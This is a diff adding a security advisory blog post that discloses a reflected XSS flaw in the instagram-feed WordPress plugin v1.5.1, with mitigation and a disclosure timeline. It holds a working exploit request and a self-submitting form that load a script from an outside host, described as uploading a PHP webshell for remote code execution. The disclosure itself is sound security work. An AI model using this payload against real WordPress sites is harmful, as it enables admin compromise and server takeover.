@@ -1,7 +1,117 @@
+<html>
 <head>
 <title>dumpco.re</title>
 <meta name="viewport" content="user-scalable = no">
 <link rel="shortcut icon" type="image/x-icon" href="../favicon.ico">
+</head>
+<body style="margin-left: 40px; background-color: black;">
+<div id="x" style="font-family: Terminus; font-size: 14px; color: white;">
+
+ __ __ _____ _____    _        _         _                             ___           _
+|  |  |   __|   __|  |_|___   |_|___ ___| |_ ___ ___ ___ ___ _____ ___|  _|___ ___ _| |
+|-   -|__   |__   |  | |   |  | |   |_ -|  _| .'| . |  _| .'|     |___|  _| -_| -_| . |
+|__|__|_____|_____|  |_|_|_|  |_|_|_|___|_| |__,|_  |_| |__,|_|_|_|   |_| |___|___|___|
+                                                |___|
+
+2018-02-05
+
+XSS IN INSTAGRAM-FEED
+=====================
+
+A reflective cross-site scripting (XSS) vulnerability was found in a WordPress
+plugin called instagram-feed v1.5.1.
+
+At the time of writing instagram-feed is ranked top 58th most popular plugin with
+2,7 million downloads and 500,000+ active installations. 85,7 % of active
+installations are still vulnerable.
+
+instagram-feed-admin.php:
+
+  1684 /**
+  1685  * Called via ajax to automatically save access token and access token secret
+  1686  * retrieved with the big blue button
+  1687  */
+  1688 function sbi_auto_save_tokens() {
+  1689     if ( current_user_can( 'edit_posts' ) ) {
+  1690         wp_cache_delete ( 'alloptions', 'options' );
+  1691
+  1692         $options = get_option( 'sb_instagram_settings', array() );
+  1693         $options['sb_instagram_at'] = isset( $_POST['access_token'] ) ? sanitize_text_field( $_POST['access_token'] ) : '';
+  1694
+  1695         update_option( 'sb_instagram_settings', $options );
+  1696         echo $_POST['access_token'];
+  1697     }
+  1698     die();
+  1699 }
+  1700 add_action( 'wp_ajax_sbi_auto_save_tokens', 'sbi_auto_save_tokens' );
+
+Line 1696 reflects unsanitized user input back to the requestee in a html/text
+content-type context, resulting in arbitrary execution of web content such as e.g.
+JavaScript, if an attacker can entice an authenticated admin user into visiting a
+page with attacker-controlled content.
+
+  POST /wp-admin/admin-ajax.php HTTP/1.1
+  Host: example.com
+  Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  X-Requested-With: XMLHttpRequest
+  Content-Length: 104
+  Cookie: ...
+  Connection: close
+
+  action=sbi_auto_save_tokens&amp;access_token=&lt;script src=http://dumpco.re/evil/wordpressxss2rce.js&gt;&lt;/script&gt;
+
+The example request above results in the following response:
+
+  HTTP/1.1 200 OK
+  Content-Length: 63
+  Connection: close
+  Content-Type: text/html; charset=UTF-8
+
+  &lt;script src=http://dumpco.re/evil/wordpressxss2rce.js&gt;&lt;/script&gt;
+
+In the example above, the XSS payload attemtps to upload a malicious PHP webshell,
+resulting in remote code execution (RCE) if successful. A description of the
+payload can be found here: http://dumpco.re/blog/xss2rce
+
+The following self-submitting form can be used to trigger the vulnerability:
+
+&lt;html&gt;
+  &lt;body&gt;
+    &lt;form action="http://example.com/wp-admin/admin-ajax.php" method="POST"&gt;
+      &lt;input type="hidden" name="action" value="sbi&amp;#95;auto&amp;#95;save&amp;#95;tokens" /&gt;
+      &lt;input type="hidden" name="access&amp;#95;token" value="&amp;lt;script&amp;#32;src&amp;#61;http&amp;#58;&amp;#47;&amp;#47;dumpco&amp;#46;re&amp;#47;evil&amp;#47;wordpressxss2rce&amp;#46;js&amp;gt;&amp;lt;&amp;#47;script&amp;gt;" /&gt;
+      &lt;input type="submit" value="Submit request" /&gt;
+    &lt;/form&gt;
+  &lt;/body&gt;
+  &lt;script&gt;document.forms[0].submit();&lt;/script&gt;
+&lt;/html&gt;
+
+MITIGATION
+==========
+
+Update to instagram-feed v1.6.0
+- https://wordpress.org/plugins/instagram-feed
+- https://plugins.trac.wordpress.org/changeset/1805420/instagram-feed
+
+TIMELINE
+========
+
+2018-01-16 Discovery
+2018-01-16 Private disclosure to vendor
+2018-01-16 Vendor responds and acknowledges the issue
+2018-01-18 Vendor releases update
+
+
+
+
+
+
+
+
+
+
+
+</div>
 <script>
 /*
  Autolinker.js
@@ -843,21 +953,5 @@ a:active {
     color: white;
 }
 </style>
-</head>
-<body style="margin-left: 40px; background-color: black;">
-<div id="x" style="font-family: Terminus; font-size: 14px; color: white;">
-
-     _    _   _
-    / |  | |_| |___ ___
- _ / /   | . | | . | . |
-|_|_/    |___|_|___|_  |
-                   |___|
-
-
-2018-02-05 XSS in instagram-feed: dumpco.re/blog/xss-instagram-feed
-2018-01-25 RCE via XSS in WordPress: dumpco.re/blog/xss2rce
-2018-01-24 Finding insecure realloc() usage: dumpco.re/blog/bad-realloc
-2017-09-05 Analysing nmap results: dumpco.re/blog/nmapoutputbrowser
-</div>
 </body>
 </html>
